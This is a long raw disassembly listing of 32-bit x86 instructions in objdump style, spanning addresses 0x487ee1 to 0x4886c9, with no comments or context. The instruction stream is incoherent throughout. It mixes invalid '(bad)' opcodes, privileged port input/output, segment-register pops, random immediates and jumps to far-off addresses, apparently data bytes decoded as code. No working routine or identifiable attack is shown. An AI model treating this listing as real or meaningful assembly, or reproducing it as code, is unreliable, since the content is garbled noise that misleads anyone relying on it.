  487ee1:	test   ebp,ebx
  487ee3:	dec    edi
  487ee4:	mov    eax,0x56cf5b03
  487ee9:	push   0xed2f469b
  487eee:	mov    ebp,0x68085d76
  487ef3:	inc    ebp
  487ef4:	inc    esi
  487ef5:	dec    eax
  487ef6:	and    eax,0x4446c740
  487efb:	dec    eax
  487efc:	loopne 0x487f55
  487efe:	jo     0x487f1d
  487f00:	mov    BYTE PTR [edi],bh
  487f02:	jge    0x487f37
  487f04:	inc    esp
  487f05:	mov    dh,0x8
  487f07:	or     eax,DWORD PTR [eax+0x58402603]
  487f0d:	add    ecx,DWORD PTR [ecx*4-0x69024ff4]
  487f14:	adc    al,0x22
  487f16:	mov    DWORD PTR [esi+0x64],ebx
  487f19:	cwde   
  487f1a:	int3   
  487f1b:	scas   al,BYTE PTR es:[edi]
  487f1c:	push   ds
  487f1d:	jbe    0x487f5a
  487f1f:	lock add DWORD PTR [ecx+0x48],ecx
  487f23:	jmp    0x487f91
  487f25:	xor    al,0x65
  487f27:	pusha  
  487f28:	test   BYTE PTR [esi+eiz*1+0x18],bl
  487f2c:	or     al,0xdb
  487f2e:	or     eax,DWORD PTR [ebp+eax*4+0xd]
  487f32:	ins    DWORD PTR es:[edi],dx
  487f33:	inc    esi
  487f34:	dec    esp
  487f35:	inc    edx
  487f36:	push   eax
  487f37:	mov    dl,0x22
  487f39:	pusha  
  487f3a:	or     BYTE PTR [eax],ah
  487f3c:	add    BYTE PTR [eax],bl
  487f3e:	loope  0x487f01
  487f40:	in     eax,0x45
  487f42:	xchg   esi,eax
  487f43:	adc    DWORD PTR [esi+0x43],0xffffffe0
  487f47:	push   edx
  487f48:	or     al,0x33
  487f4a:	dec    esp
  487f4b:	stc    
  487f4c:	ja     0x487f8d
  487f4e:	push   eax
  487f4f:	push   0xc586c19a
  487f54:	inc    edi
  487f55:	loop   0x487faf
  487f57:	or     bl,BYTE PTR [eax]
  487f59:	sbb    BYTE PTR [ecx+ebp*2+0x5897c25b],ah
  487f60:	or     al,0x18
  487f62:	or     al,0xc
  487f64:	sbb    ecx,DWORD PTR [ecx]
  487f66:	shl    BYTE PTR [ecx+0x18],0x92
  487f6a:	push   eax
  487f6b:	adc    al,0xb8
  487f6d:	ds js  0x487f31
  487f70:	or     BYTE PTR [edi],bh
  487f72:	pop    edi
  487f73:	adc    al,0xf3
  487f75:	push   ss
  487f76:	mov    esi,edi
  487f78:	popf   
  487f79:	sbb    eax,0xd3b4450c
  487f7e:	bound  ecx,QWORD PTR [ebx]
  487f80:	js     0x487f3c
  487f82:	pop    ebp
  487f83:	mov    bh,0xe0
  487f85:	sbb    bl,ch
  487f87:	pop    ss
  487f88:	mov    ecx,0x313c1827
  487f8d:	or     al,0x8b
  487f8f:	and    BYTE PTR [ebx],dl
  487f91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  487f92:	mov    bl,0xb8
  487f94:	inc    ebx
  487f95:	sub    edx,DWORD PTR [edx+0x7]
  487f98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  487f99:	pop    eax
  487f9a:	ja     0x487fc3
  487f9c:	fld    DWORD PTR [edx+0x66e11179]
  487fa2:	mov    ds:0x64408b15,al
  487fa7:	ret    0xa82
  487faa:	push   ebp
  487fab:	or     cl,BYTE PTR [ebx]
  487fad:	out    0xcd,al
  487faf:	xor    BYTE PTR [eax+0x3f],bh
  487fb2:	test   eax,0x1b1cf775
  487fb7:	sub    BYTE PTR [esi+0x4],bl
  487fba:	pop    edx
  487fbb:	jno    0x488015
  487fbd:	or     al,BYTE PTR [esi]
  487fbf:	cmp    dl,BYTE PTR [edx+eax*2-0x76]
  487fc3:	shl    BYTE PTR [ebp*2+0x21eb4033],cl
  487fca:	sub    BYTE PTR [eax+ebx*1],cl
  487fcd:	sbb    BYTE PTR [ebx],bh
  487fcf:	adc    DWORD PTR [ecx+0x33],ebx
  487fd2:	or     al,0x18
  487fd4:	pop    ebx
  487fd5:	push   esi
  487fd6:	and    cl,ah
  487fd8:	loopne 0x487ff7
  487fda:	fmul   QWORD PTR [eax]
  487fdc:	sbb    dl,BYTE PTR ds:0x435b160f
  487fe2:	fdivr  QWORD PTR [edx-0xa37b0df]
  487fe8:	or     al,0x9
  487fea:	lods   al,BYTE PTR ds:[esi]
  487feb:	ret    0xf144
  487fee:	mov    al,0x76
  487ff0:	pusha  
  487ff1:	pop    DWORD PTR ds:0x23327cfa
  487ff7:	clc    
  487ff8:	sub    ebp,edx
  487ffa:	cli    
  487ffb:	add    al,0x63
  487ffe:	xor    eax,0xc77f177f
  488003:	add    BYTE PTR [ebx+0x16],dl
  488006:	js     0x487fd9
  488008:	inc    esi
  488009:	mov    DWORD PTR ds:0x21ecf21,edi
  48800f:	xchg   edx,eax
  488010:	xor    DWORD PTR [ecx+0x2427502],ebx
  488016:	jl     0x488049
  488018:	add    al,0x46
  48801a:	in     al,dx
  48801b:	adc    BYTE PTR [edi+0xd689502],0x38
  488022:	mov    ebp,0x37d03393
  488027:	sti    
  488028:	pop    esp
  488029:	imul   eax,DWORD PTR [eax+0x79f83992],0xfffffff8
  488030:	out    0xf4,al
  488032:	adc    DWORD PTR [ebp-0x4814e3c0],0xdd8c0667
  48803c:	aam    0xf
  48803e:	(bad)  
  48803f:	clc    
  488040:	sbb    eax,0x7203ef42
  488045:	loopne 0x487ffb
  488047:	imul   ebp,ebp,0x32c63b18
  48804d:	ficom  WORD PTR [ecx+0x38]
  488050:	sbb    dl,al
  488052:	and    edi,DWORD PTR [eax-0x14]
  488055:	push   ebp
  488056:	pop    ss
  488057:	add    edi,eax
  488059:	aaa    
  48805a:	mov    WORD PTR [edi+eiz*1+0x43027b7],?
  488061:	mov    dl,0x67
  488063:	sub    edx,0xf
  488066:	aas    
  488067:	adc    BYTE PTR [esi+0x7dc10ce1],dl
  48806d:	adc    DWORD PTR [edi+0x14],esi
  488070:	add    DWORD PTR [ecx],esp
  488072:	loopne 0x488024
  488074:	push   cs
  488075:	rol    BYTE PTR ds:0x6f7f9179,1
  48807b:	outs   dx,BYTE PTR ds:[esi]
  48807c:	fadd   DWORD PTR cs:[eax]
  48807f:	xor    ecx,DWORD PTR [edi]
  488081:	jp     0x48804a
  488083:	jg     0x4880df
  488085:	idiv   BYTE PTR [edx]
  488087:	lock or BYTE PTR [ecx+0x7f],bl
  48808b:	dec    edi
  48808c:	cmp    eax,0x3731f003
  488091:	inc    esi
  488092:	mov    al,0x3d
  488094:	jl     0x4880cc
  488096:	sti    
  488097:	(bad)
  48809b:	or     al,bh
  48809d:	inc    esp
  48809e:	add    edx,0xf
  4880a1:	mov    eax,0xcebfb0e
  4880a6:	cmp    esp,DWORD PTR [ecx]
  4880a8:	add    eax,0x1c7515f5
  4880ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4880af:	mov    bh,0x35
  4880b1:	mov    al,0xc6
  4880b3:	sti    
  4880b4:	push   edi
  4880b5:	push   eax
  4880b6:	sbb    eax,0x5c84c808
  4880bb:	in     al,dx
  4880bc:	nop
  4880bd:	push   esp
  4880be:	pop    ecx
  4880bf:	dec    ecx
  4880c0:	aam    0xd4
  4880c2:	xchg   esp,eax
  4880c3:	xchg   edx,eax
  4880c4:	adc    eax,DWORD PTR [ecx+0x2a021f61]
  4880ca:	test   BYTE PTR [ecx],ah
  4880cc:	loope  0x4880b6
  4880ce:	nop
  4880cf:	push   ds
  4880d0:	mov    ebx,0x2b68072a
  4880d5:	mov    edx,esi
  4880d7:	adc    BYTE PTR [edx],bh
  4880d9:	lea    ebp,[ebx+0x7734a21]
  4880df:	sub    BYTE PTR [edi+0x2],0xdf
  4880e3:	xor    BYTE PTR [ebx+0x48306157],cl
  4880e9:	add    BYTE PTR [eax+0x9483807],ah
  4880ef:	and    BYTE PTR [ecx+0x0],bh
  4880f2:	pop    ebx
  4880f3:	jb     0x488115
  4880f5:	rol    BYTE PTR [ecx],0xa0
  4880f8:	add    al,0xf8
  4880fa:	aaa    
  4880fb:	es mov cl,0x4c
  4880fe:	inc    ebp
  4880ff:	test   DWORD PTR [eax+0x5616d2e],ebx
  488105:	lahf   
  488106:	std    
  488107:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  488108:	mov    al,0x53
  48810a:	add    al,0xaf
  48810c:	xchg   ebx,eax
  48810d:	rcl    DWORD PTR [eax-0x31],0x35
  488111:	push   ebp
  488112:	sbb    DWORD PTR [edx+0xd395980],edx
  488118:	cwde   
  488119:	scas   al,BYTE PTR es:[edi]
  48811a:	dec    eax
  48811b:	ins    DWORD PTR es:[edi],dx
  48811c:	push   ds
  48811d:	sub    DWORD PTR [ebx-0x5c],0xd37079bc
  488124:	push   ds
  488125:	xchg   esi,eax
  488126:	rcl    BYTE PTR [ebx-0x160bb238],cl
  48812c:	popa   
  48812d:	clc    
  48812e:	sub    cl,BYTE PTR [edi]
  488130:	mov    WORD PTR [ecx],es
  488132:	and    eax,0xc216457
  488137:	ret    
  488138:	fisubr DWORD PTR [ebx+0x55122a16]
  48813e:	daa    
  48813f:	jne    0x488131
  488141:	xor    al,0x12
  488143:	pop    ss
  488144:	inc    eax
  488145:	outs   dx,DWORD PTR ds:[esi]
  488146:	fcom   QWORD PTR [esi-0x509ef550]
  48814c:	or     BYTE PTR [ebx+0x18],cl
  48814f:	sbb    BYTE PTR [ecx+0x28],ch
  488152:	sub    al,0x21
  488154:	push   0x57032e1e
  488159:	or     al,0x3
  48815b:	popf   
  48815c:	adc    ebx,DWORD PTR [ebp-0xa1eb6b3]
  488162:	add    eax,0x589f16a9
  488167:	mov    al,0x28
  488169:	ja     0x488112
  48816b:	rol    BYTE PTR [esi],1
  48816d:	mov    DWORD PTR [ebx-0x1f],esi
  488170:	nop
  488171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  488172:	clc    
  488173:	repnz or al,BYTE PTR ds:0x33778c62
  48817a:	nop/reserved BYTE PTR [ecx]
  48817d:	fwait
  48817e:	sbb    eax,0xe4a50052
  488183:	icebp  
  488184:	inc    ebp
  488185:	mov    bh,0xdf
  488187:	les    eax,FWORD PTR [edi]
  488189:	xor    eax,eax
  48818b:	pop    ds
  48818c:	mov    edi,DWORD PTR [ebp-0x20]
  48818f:	push   ds
  488190:	push   ebp
  488191:	ins    BYTE PTR es:[edi],dx
  488192:	mov    WORD PTR [edi+0x11],?
  488195:	jns    0x4881ec
  488197:	lea    ecx,[edi-0x6d]
  48819a:	pushf  
  48819b:	push   es
  48819c:	test   DWORD PTR [edi+0x3324e064],eax
  4881a2:	xor    dh,ah
  4881a4:	(bad)  
  4881a5:	lock pop ecx
  4881a7:	mov    edx,0x521e35c2
  4881ac:	addr16 inc esi
  4881ae:	sbb    al,0xc
  4881b0:	lock mov WORD PTR [ecx+ecx*8],ds
  4881b4:	adc    BYTE PTR [edi],bh
  4881b6:	inc    edx
  4881b7:	clc    
  4881b8:	lock and cl,ah
  4881bb:	adc    DWORD PTR [ecx-0x784c8aac],esp
  4881c1:	les    esp,FWORD PTR [eax-0x63]
  4881c4:	add    DWORD PTR [eax-0x21],ebp
  4881c7:	mov    dl,0xe8
  4881c9:	mov    DWORD PTR [ecx-0x13edd7ec],eax
  4881cf:	dec    edx
  4881d0:	xchg   ebp,eax
  4881d1:	or     BYTE PTR [edi-0x739bfa68],ch
  4881d7:	jo     0x4881c5
  4881d9:	call   0x86492e5
  4881de:	inc    ebx
  4881df:	lea    edx,[ebx+0x10]
  4881e2:	mov    ecx,0x321edc96
  4881e7:	out    0x8b,eax
  4881e9:	push   ds
  4881ea:	and    BYTE PTR [ecx-0x457fc6fc],bh
  4881f0:	or     BYTE PTR [ebx+0x17],dh
  4881f3:	and    eax,0x4ece160a
  4881f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4881f9:	test   DWORD PTR [esp+eax*2-0x1047fea8],esp
  488200:	mov    DWORD PTR [edi],ebp
  488202:	jae    0x488185
  488204:	mov    ebx,0x648a2669
  488209:	jmp    0x488283
  48820b:	jmp    0x8b5ff72e
  488210:	sbb    BYTE PTR [edi+ebp*2+0x430aec01],bl
  488217:	sbb    dh,bl
  488219:	sub    eax,0x241db397
  48821e:	jmp    0x488279
  488220:	cmp    eax,0x1d080e7e
  488225:	mov    cl,0x72
  488227:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  488228:	sub    al,BYTE PTR [ebx+0x7d]
  48822b:	cmp    eax,DWORD PTR [ebp-0x28]
  48822e:	daa    
  48822f:	in     al,dx
  488230:	cmp    BYTE PTR es:[eax+edx*2-0x12],dl
  488235:	push   ss
  488236:	test   BYTE PTR [ecx-0x28],al
  488239:	retf   
  48823a:	ja     0x48825b
  48823c:	out    dx,al
  48823d:	jle    0x488271
  48823f:	or     ecx,esi
  488241:	sbb    al,0xb5
  488243:	fadd   DWORD PTR [ecx+eiz*8+0x70]
  488247:	xchg   ecx,eax
  488248:	fadd   DWORD PTR [esi+ecx*1-0x4681caf2]
  48824f:	mov    al,ds:0xf1c49448
  488254:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  488256:	or     dl,BYTE PTR [eax]
  488258:	add    DWORD PTR [ecx-0x8],edi
  48825b:	out    dx,eax
  48825c:	and    eax,0xd1c91a2
  488261:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  488262:	mul    DWORD PTR [esi+0x6b43a5b7]
  488268:	cmp    bh,bh
  48826a:	xor    BYTE PTR [ecx+eax*4-0x381d8713],al
  488271:	add    esp,eax
  488273:	inc    ecx
  488274:	rcr    BYTE PTR [ebp-0x30d65e7f],1
  48827a:	add    ecx,ebx
  48827c:	pop    ebx
  48827d:	pop    edx
  48827e:	(bad)  
  48827f:	push   eax
  488280:	inc    esp
  488281:	pop    ebp
  488282:	mov    al,0x2d
  488284:	jo     0x488212
  488286:	and    BYTE PTR [ebx-0x8],0xa1
  48828a:	or     BYTE PTR [edx],dl
  48828c:	inc    esp
  48828d:	and    BYTE PTR [eax],dh
  48828f:	scas   eax,DWORD PTR es:[edi]
  488290:	push   ecx
  488291:	xchg   edi,eax
  488292:	scas   al,BYTE PTR es:[edi]
  488293:	xor    BYTE PTR [ebp-0x1c],bh
  488296:	or     al,0x10
  488298:	(bad)  
  48829a:	mul    BYTE PTR [esi]
  48829c:	rol    ecx,0xdc
  48829f:	and    eax,0xe7c9ec4d
  4882a4:	fmul   st,st(1)
  4882a6:	cmp    BYTE PTR ds:0x4dd8c8d7,bl
  4882ac:	or     BYTE PTR [edi],bl
  4882ae:	enter  0xc85b,0x4b
  4882b2:	adc    BYTE PTR [eax],0x44
  4882b5:	(bad)  
  4882b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4882b7:	add    dh,BYTE PTR [edx+0x2549cbed]
  4882bd:	pop    ds
  4882be:	fnstenv [eax+0x37282898]
  4882c4:	pop    ebp
  4882c5:	jge    0x4882f9
  4882c7:	or     al,0x78
  4882c9:	fmul   st(5),st
  4882cb:	push   esp
  4882cc:	push   ebp
  4882cd:	or     BYTE PTR [esi-0xf765e05],ah
  4882d3:	inc    eax
  4882d4:	ins    BYTE PTR es:[edi],dx
  4882d5:	xchg   esi,eax
  4882d6:	adc    BYTE PTR [ecx+0x1a],bl
  4882d9:	ret    0xb85a
  4882dc:	aas    
  4882dd:	out    dx,al
  4882de:	jmp    0x5103:0x86285202
  4882e5:	sbb    BYTE PTR [ebx+edx*1],dh
  4882e8:	dec    ebx
  4882e9:	shr    BYTE PTR [esi],1
  4882eb:	nop
  4882ec:	rol    DWORD PTR ds:0x9a4743e8,0x23
  4882f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4882f4:	push   0x61eb0608
  4882f9:	mov    ecx,0x5585803f
  4882fe:	xchg   edi,eax
  4882ff:	sub    eax,DWORD PTR [edx+0x18]
  488302:	inc    eax
  488303:	mov    ebx,0xb02c2056
  488308:	mov    ch,0xe8
  48830a:	hlt    
  48830b:	add    eax,0xe76b474
  488310:	mov    edi,0x184a3b4b
  488315:	cdq    
  488316:	and    bh,BYTE PTR [esi+0x3]
  488319:	mov    esp,0x72472502
  48831e:	fwait
  48831f:	dec    ebx
  488320:	or     BYTE PTR [esi],al
  488322:	add    BYTE PTR [eax],ch
  488324:	add    DWORD PTR [ebp+0x50b011bb],eax
  48832a:	cmp    dl,BYTE PTR [edi+0xa]
  48832d:	icebp  
  48832e:	or     eax,0xde5aa959
  488333:	cld    
  488334:	es test eax,0xd1e0270
  48833a:	aad    0x6
  48833c:	inc    ecx
  48833d:	js     0x4882c4
  48833f:	lds    ecx,FWORD PTR es:[ecx]
  488342:	test   eax,0x89007390
  488347:	pop    ebx
  488348:	std    
  488349:	in     al,dx
  48834a:	test   al,0x98
  48834c:	jecxz  0x48837e
  48834e:	jo     0x488396
  488350:	adc    al,0x71
  488352:	nop
  488353:	pusha  
  488354:	pop    esi
  488355:	xchg   ebx,eax
  488356:	add    DWORD PTR [edi+0x8fb1446],esp
  48835c:	loope  0x488388
  48835e:	dec    ecx
  48835f:	test   ax,0x303b
  488363:	push   ss
  488364:	inc    esi
  488365:	popa   
  488366:	popa   
  488367:	jne    0x4883c4
  488369:	sub    ecx,0xb2461292
  48836f:	test   DWORD PTR [edx+0x58e05766],ebx
  488375:	in     al,0x4a
  488377:	add    eax,eax
  488379:	sub    DWORD PTR [esi],ecx
  48837b:	adc    al,0xe8
  48837d:	inc    esp
  48837e:	shr    BYTE PTR fs:[esp+edx*2-0x18],0x78
  488384:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  488385:	imul   edi,DWORD PTR [edx+0x2b6060ed],0x4cec1fc2
  48838f:	lock push es
  488391:	sub    al,0x88
  488393:	xchg   ecx,eax
  488394:	call   0x17c92f89
  488399:	(bad)  
  48839a:	fld    TBYTE PTR [esi+0x5bc1073]
  4883a0:	mov    esp,0xf90f3732
  4883a5:	sbb    al,0x71
  4883a7:	adc    al,0x94
  4883a9:	jmp    0x488353
  4883ab:	sub    eax,edx
  4883ad:	and    BYTE PTR [edx],cl
  4883af:	or     ecx,DWORD PTR [ebx-0x7ecb9ddb]
  4883b5:	rcl    DWORD PTR [eax],0xd4
  4883b8:	cmp    ebx,DWORD PTR [ecx+0x39d8e4c0]
  4883be:	sub    eax,0xa90d3306
  4883c3:	add    edi,0x3a11bd9
  4883c9:	push   es
  4883ca:	arpl   WORD PTR [edi+0x74],cx
  4883cd:	adc    al,0x12
  4883cf:	icebp  
  4883d0:	add    BYTE PTR [ecx+0x4c],dh
  4883d3:	imul   edx,DWORD PTR [eax*4-0x36ba8f4],0xffffffac
  4883db:	and    ecx,DWORD PTR [ebx]
  4883dd:	(bad)  [eax]
  4883df:	test   DWORD PTR [ecx-0x13dfe69e],ebp
  4883e5:	mov    ah,0xa
  4883e7:	test   eax,0x2b8c905e
  4883ec:	add    esi,esp
  4883ee:	cmp    bh,BYTE PTR [esi-0x3f]
  4883f1:	mov    edx,0x68d98661
  4883f6:	mov    gs,edi
  4883f8:	ds je  0x48843b
  4883fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4883fc:	push   edi
  4883fd:	iret   
  4883fe:	repz push es
  488400:	push   esp
  488401:	or     DWORD PTR ds:0xbf849aba,ebx
  488407:	adc    DWORD PTR [esi+0x38],0xde7308c6
  48840e:	nop
  48840f:	inc    eax
  488410:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  488411:	dec    ebp
  488412:	xor    BYTE PTR [edi],ch
  488414:	add    bl,BYTE PTR [ebp+0xc]
  488417:	ins    BYTE PTR es:[edi],dx
  488418:	add    DWORD PTR [edi],edx
  48841a:	ins    BYTE PTR es:[edi],dx
  48841b:	or     al,0x2f
  48841d:	add    al,0x4b
  48841f:	mov    cl,0x96
  488421:	ret    0xef0
  488424:	push   esp
  488425:	add    al,0xe1
  488427:	pusha  
  488428:	lods   al,BYTE PTR ds:[esi]
  488429:	jp     0x4883ee
  48842b:	dec    eax
  48842c:	dec    edx
  48842d:	or     bh,al
  48842f:	and    dl,cl
  488431:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  488433:	or     al,0xb9
  488435:	mov    eax,ds:0x4c92bfad
  48843a:	clc    
  48843b:	sar    edi,1
  48843d:	jns    0x488459
  48843f:	adc    edi,0x2e
  488442:	ins    BYTE PTR es:[edi],dx
  488443:	mov    ecx,DWORD PTR [esi+0x3]
  488446:	inc    eax
  488447:	pop    edi
  488448:	or     eax,0x26f18d32
  48844d:	mov    al,0x7b
  48844f:	or     al,0x28
  488451:	es pop edx
  488453:	push   es
  488454:	jne    0x488461
  488456:	add    DWORD PTR [ebp-0x7f],edi
  488459:	fstp   QWORD PTR [esi]
  48845b:	xchg   edx,eax
  48845c:	add    esi,esp
  48845e:	add    DWORD PTR [esi-0x3e5a02f6],edx
  488464:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  488465:	xor    bh,cl
  488467:	cmp    eax,0x36566cf1
  48846c:	ds add ch,bh
  48846f:	pop    esi
  488470:	push   0x2
  488472:	push   DWORD PTR [edx+eax*2]
  488475:	or     ecx,DWORD PTR [edi]
  488477:	pop    ebp
  488478:	scas   eax,DWORD PTR es:[edi]
  488479:	dec    ecx
  48847a:	push   edi
  48847b:	sbb    dh,BYTE PTR ds:0x6d81b707
  488481:	leave  
  488482:	adc    DWORD PTR [ebx+0x6621a49a],0x2
  488489:	fwait
  48848a:	je     0x4884bf
  48848c:	lahf   
  48848d:	fucom  st(1)
  48848f:	or     al,0x3b
  488491:	sbb    ecx,DWORD PTR [eax+0x53]
  488494:	pop    es
  488495:	push   ebp
  488496:	outs   dx,DWORD PTR ds:[esi]
  488497:	sbb    BYTE PTR [ecx-0x26],bh
  48849a:	shr    DWORD PTR [edx+ebp*8],cl
  48849d:	or     al,0xd
  48849f:	sbb    al,0x14
  4884a1:	push   es
  4884a2:	je     0x4884d7
  4884a4:	pop    esi
  4884a5:	jbe    0x4884af
  4884a7:	leave  
  4884a8:	sbb    BYTE PTR [eax],bl
  4884aa:	push   es
  4884ab:	cmp    ebx,DWORD PTR [esi+0x64]
  4884ae:	push   ecx
  4884af:	scas   eax,DWORD PTR es:[edi]
  4884b0:	in     eax,dx
  4884b1:	sub    DWORD PTR ds:0x8c86b364,0x7b
  4884b8:	sub    BYTE PTR [edi+eiz*2],dh
  4884bb:	push   ecx
  4884bc:	and    al,0x3b
  4884be:	inc    ebx
  4884bf:	sbb    dl,BYTE PTR [ebx-0x70]
  4884c2:	pop    ss
  4884c3:	and    eax,0x78fb882e
  4884c8:	sbb    al,0x69
  4884ca:	mov    BYTE PTR [esi+0x456c021],0x13
  4884d1:	or     esp,ecx
  4884d3:	ja     0x4884f6
  4884d5:	enter  0xa94e,0x4d
  4884d9:	mov    ebp,0x83c9ade1
  4884de:	or     eax,0x143b2474
  4884e3:	clc    
  4884e4:	popa   
  4884e5:	xor    cl,BYTE PTR [si-0x5e9f]
  4884ea:	and    BYTE PTR [ecx],ah
  4884ec:	sub    DWORD PTR [ebx],eax
  4884ee:	push   edx
  4884ef:	js     0x2cac524d
  4884f5:	cs loopne 0x4884d6
  4884f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4884f9:	mov    al,0xe4
  4884fb:	iret   
  4884fc:	xor    BYTE PTR [ecx+eax*4-0xc],0xf4
  488501:	lock mov eax,ds:0x48c17290
  488507:	push   es
  488508:	cmp    eax,esi
  48850a:	hlt    
  48850b:	push   esp
  48850c:	add    al,0x33
  48850e:	pusha  
  48850f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  488510:	xchg   edi,eax
  488511:	clc    
  488512:	dec    esi
  488513:	dec    eax
  488514:	or     eax,0xa364ba0e
  488519:	or     ah,ch
  48851b:	push   0x2
  48851d:	neg    BYTE PTR [eax]
  48851f:	add    bl,BYTE PTR [ebp-0x1f09d545]
  488525:	popa   
  488526:	add    DWORD PTR [edx],ecx
  488528:	pop    esp
  488529:	or     DWORD PTR [ebx+0x3a2ac6ea],0x7b
  488530:	or     al,0x96
  488532:	clc    
  488533:	popf   
  488534:	xchg   esi,eax
  488535:	sub    eax,0xb05fabd5
  48853a:	jp     0x4885b6
  48853c:	sub    al,BYTE PTR [ebx]
  48853e:	sbb    eax,0x781842e8
  488543:	popf   
  488544:	imul   ecx,DWORD PTR [esi+0x1eb2d648],0x41c79fdd
  48854e:	or     DWORD PTR [edi+0x16eb5b97],esi
  488554:	mov    bl,0x5a
  488556:	sbb    ch,al
  488558:	loopne 0x488538
  48855a:	push   0xffffffd1
  48855c:	das    
  48855d:	retf   0x30a0
  488560:	mul    DWORD PTR [edx]
  488562:	pop    ss
  488563:	push   ds
  488564:	adc    al,0xf7
  488566:	mov    bh,0x8e
  488568:	shl    BYTE PTR [edi-0x6147dbc2],1
  48856e:	(bad)  
  48856f:	repz mov cl,0xf7
  488572:	jnp    0x488557
  488574:	lahf   
  488575:	adc    eax,0x647e8972
  48857a:	jecxz  0x488573
  48857c:	add    DWORD PTR [edx-0x70],eax
  48857f:	mov    bl,0x85
  488581:	mov    ds:0x18352658,eax
  488586:	pop    ebp
  488587:	push   eax
  488588:	push   edi
  488589:	fidivr WORD PTR [ebp+0xe]
  48858c:	fdiv   DWORD PTR [edi]
  48858e:	cmp    bl,BYTE PTR [ecx-0x73a1378c]
  488594:	pop    edx
  488595:	sbb    BYTE PTR cs:[ebx-0x2d],bh
  488599:	sbb    al,0x1c
  48859b:	daa    
  48859c:	push   eax
  48859d:	pop    eax
  48859e:	or     al,0x17
  4885a0:	cmp    al,0x5e
  4885a2:	das    
  4885a3:	ror    bh,0xee
  4885a6:	sbb    eax,0xece0b96b
  4885ab:	loope  0x4885ca
  4885ad:	dec    edx
  4885ae:	adc    BYTE PTR [ebp+ebx*2-0x3e3e87b0],dl
  4885b5:	add    eax,0xeb9b19cc
  4885ba:	pop    eax
  4885bb:	pusha  
  4885bc:	sbb    al,0x7
  4885be:	gs pop ebx
  4885c0:	jb     0x488589
  4885c2:	call   0xde1952d9
  4885c7:	sbb    BYTE PTR [ecx],cl
  4885c9:	sub    DWORD PTR [edi],ecx
  4885cb:	or     bh,BYTE PTR [eax-0x25908bf5]
  4885d1:	sahf   
  4885d2:	popf   
  4885d3:	shr    BYTE PTR [esi+0x51],1
  4885d6:	push   0x43d126c8
  4885db:	push   ebp
  4885dc:	das    
  4885dd:	sub    DWORD PTR [ecx+0x18],edi
  4885e0:	and    BYTE PTR [ebx-0x4b],ah
  4885e3:	call   0x53f8c995
  4885e8:	and    DWORD PTR [eax+esi*8+0x12678097],esp
  4885ef:	scas   eax,DWORD PTR es:[edi]
  4885f0:	add    dh,BYTE PTR [edi+0x14]
  4885f3:	mov    WORD PTR [bx-0x7],gs
  4885f7:	daa    
  4885f8:	jbe    0x48857d
  4885fa:	jg     0x488660
  4885fc:	add    BYTE PTR [ecx+0x70a2b54f],dh
  488602:	cmp    eax,0xdc1ca557
  488607:	pop    eax
  488608:	xchg   edi,eax
  488609:	fisubr DWORD PTR [esi]
  48860b:	ja     0x488620
  48860d:	jne    0x4885cf
  48860f:	and    eax,0x138657e3
  488614:	lea    edx,[edi+0x1d]
  488617:	mov    eax,esp
  488619:	jns    0x48861e
  48861b:	fadd   QWORD PTR [edx-0x7c42882c]
  488621:	(bad)  
  488622:	sbb    eax,0xe19f8495
  488627:	mov    bh,0x5c
  488629:	mov    dl,BYTE PTR fs:[eax+0x10]
  48862d:	dec    dl
  48862f:	dec    eax
  488630:	push   es
  488631:	sbb    ebp,ebx
  488633:	xor    BYTE PTR [edi],al
  488635:	xchg   esp,eax
  488636:	and    dh,BYTE PTR [edi-0x232a0285]
  48863c:	adc    al,BYTE PTR [edx+edi*2+0x47]
  488640:	push   0x3b3891c4
  488645:	xor    BYTE PTR [esi-0x23cfe2cd],0x17
  48864c:	xchg   BYTE PTR [ebx-0x35],dl
  48864f:	cmp    edi,DWORD PTR [esi+0x1e]
  488652:	pop    eax
  488653:	jecxz  0x48869d
  488655:	sbb    eax,0x8a2c152
  48865a:	push   eax
  48865b:	ins    BYTE PTR es:[edi],dx
  48865c:	xor    BYTE PTR [edi+0xc],dl
  48865f:	sbb    eax,0xc7dfb94b
  488664:	ins    DWORD PTR es:[edi],dx
  488665:	xchg   DWORD PTR [ebp-0x24a91545],eax
  48866b:	sub    eax,0x8d500806
  488670:	scas   eax,DWORD PTR es:[edi]
  488671:	add    BYTE PTR [eax+0x3a],dl
  488674:	inc    esi
  488675:	dec    eax
  488676:	es ret 
  488678:	or     edx,esp
  48867a:	jbe    0x4886af
  48867c:	mov    ebx,ebx
  48867e:	add    al,0xdc
  488680:	dec    esi
  488681:	inc    eax
  488682:	mov    al,BYTE PTR [edx-0x58]
  488685:	in     al,0x9
  488687:	or     BYTE PTR gs:[ecx-0x80],ch
  48868b:	push   esp
  48868c:	mov    bh,0xfc
  48868e:	add    esp,DWORD PTR [ebp+0x736d5781]
  488694:	scas   eax,DWORD PTR es:[edi]
  488695:	mov    ebp,0x58d56000
  48869a:	popf   
  48869b:	ss push ss
  48869d:	pop    es
  48869e:	xor    eax,0xfa7a8f4c
  4886a3:	bnd jle 0x4886fe
  4886a6:	cmp    DWORD PTR [edx],esp
  4886a8:	sbb    DWORD PTR [eax],edi
  4886aa:	push   0x72
  4886ac:	mov    ds:0x75a7562,eax
  4886b1:	jp     0x488662
  4886b3:	xor    DWORD PTR ds:0xc7040a15,esp
  4886b9:	(bad)  [eax-0x10626fba]
  4886bf:	das    
  4886c0:	mov    al,0xe1
  4886c2:	dec    ebp
  4886c3:	jb     0x4886d8
  4886c5:	jecxz  0x4886d7
  4886c7:	je     0x4886ee
  4886c9:	add    DWORD PTR [eax],esp
